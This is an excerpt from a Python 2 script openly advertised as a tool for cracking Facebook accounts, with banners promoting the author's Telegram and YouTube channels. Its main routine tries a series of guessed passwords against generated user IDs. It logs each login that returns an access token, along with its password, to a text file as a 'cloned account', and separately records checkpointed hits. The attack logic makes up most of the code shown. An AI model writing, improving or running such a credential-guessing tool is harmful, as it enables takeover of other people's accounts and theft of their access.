# MY TELEGRAM CHANNEL @SHAHI MR2_11 
# MY TELEGRAM GROUP @MRMR2_11
#MY GITHUB HTTPS://GITHUB.COM/RAYEESMR2_11538 
#THIS SCRIPT FREE 
...
def youtube():
	...
	os.system("xdg-open https://youtube.com/@MR2_11atx7159")
	menu()
...
def telegram():
	...
	os.system("xdg-open https://t.me/BEST_TECHING_001")
...
\033[1;97m--------------------------------------------------
\033[1;91m Author      : 𝙼𝚁 𝚂𝙷𝙰𝙷𝙸 𝙹𝙾𝙺𝙴𝚁 𝙺𝚑𝙰𝚗𝚘𝚘
\033[1;91m GitHub      : 𝗠𝗥 𝗦𝗛𝗔𝗛𝗜 𝗝𝗢𝗞𝗘𝗥 
\033[1;91m YouTube     : 𝗞𝗢𝗞𝗢 𝗝𝗢𝗞𝗘𝗥 
\033[1;91m Telegram CH   : 𝗛𝗗 𝗞𝗢𝗞𝗢  
\033[1;91m TLEGRAM GP    : 𝗠𝗥 𝗦𝗛𝗔𝗛𝗜 𝗝𝗢𝗞𝗘𝗥 
\033[1;97m--------------------------------------------------
"""
...
def Select_menu():
    ...
    if PROFAISOR == '':
        ...
        os.system('clear')
        print logo 
        print '\x1b[1;92m CRACK AFG FB ALL SIM CREATED BY RAYEES MR2_11'
        print '\x1b[1;92m THISE SCRIPT CREATED BY RAYEES MR2_11'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m[MR2_11_OK] ' + k + c + user + ' | ' + pass1
                okb = open('MR2_11.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;93m[MR2_11_CP] ' + k + c + user + ' | ' + pass1
                cps = open('MR2_11.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m[MR2_11_OK] ' + k + c + user + ' | ' + pass2
                    okb = open('MR2_11.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;93m[MR2_11_CP] ' + k + c + user + ' | ' + pass2
                    cps = open('MR2_11.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m[MR2_11_OK] ' + k + c + user + ' | ' + pass3
                        okb = open('MR2_11.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;93m[MR2_11_CP] ' + k + c + user + ' | ' + pass3
                        cps = open('MR2_11.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m[MR2_11_OK] ' + k + c + user + ' | ' + pass4
                            okb = open('MR2_11.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;93m[MR2_11_CP] ' + k + c + user + ' | ' + pass4
                            cps = open('MR2_11.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m[MR2_11_OK] ' + k + c + user + ' | ' + pass5
                                okb = open('MR2_11.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;93m[MR2_11_CP] ' + k + c + user + ' | ' + pass5
                                cps = open('MR2_11.txt', 'a')
    ...
    print ' Cloned Accounts Has Been Saved : MR2_11.txt'
